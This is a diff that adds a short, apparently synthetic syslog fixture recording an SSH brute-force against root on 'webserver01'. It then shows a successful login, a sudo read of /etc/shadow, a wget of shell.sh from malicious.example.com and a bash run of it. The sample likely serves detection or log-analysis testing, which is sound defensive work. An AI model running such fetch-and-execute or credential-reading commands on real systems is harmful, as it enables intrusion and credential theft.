@@ -1,0 +1,14 @@
+<134>Jan 15 10:00:01 webserver01 sshd[1234]: Accepted publickey for deploy from 192.168.1.100 port 52222
+<132>Jan 15 10:05:30 webserver01 sshd[1235]: Failed password for root from 10.0.0.99 port 49152
+<132>Jan 15 10:05:31 webserver01 sshd[1236]: Failed password for root from 10.0.0.99 port 49153
+<132>Jan 15 10:05:32 webserver01 sshd[1237]: Failed password for root from 10.0.0.99 port 49154
+<132>Jan 15 10:05:33 webserver01 sshd[1238]: Failed password for root from 10.0.0.99 port 49155
+<132>Jan 15 10:05:34 webserver01 sshd[1239]: Failed password for root from 10.0.0.99 port 49156
+<132>Jan 15 10:05:35 webserver01 sshd[1240]: Failed password for root from 10.0.0.99 port 49157
+<132>Jan 15 10:05:36 webserver01 sshd[1241]: Failed password for root from 10.0.0.99 port 49158
+<132>Jan 15 10:05:37 webserver01 sshd[1242]: Failed password for root from 10.0.0.99 port 49159
+<134>Jan 15 10:05:38 webserver01 sshd[1243]: Accepted password for root from 10.0.0.99 port 49160
+<38>Jan 15 10:05:40 webserver01 sudo[1244]:   root : TTY=pts/0 ; PWD=/root ; COMMAND=/usr/bin/cat /etc/shadow
+<38>Jan 15 10:05:45 webserver01 sudo[1245]:   root : TTY=pts/0 ; PWD=/root ; COMMAND=/usr/bin/wget http://malicious.example.com/shell.sh
+<38>Jan 15 10:05:50 webserver01 sudo[1246]:   root : TTY=pts/0 ; PWD=/root ; COMMAND=/bin/bash shell.sh
+<38>Jan 15 10:06:00 webserver01 kernel: [1234.567] audit: type=1400 audit(1705314360.123): denied pid=1246 uid=0 comm="bash" path="/etc/cron.d/crontab" dev="sda1" ino=12345
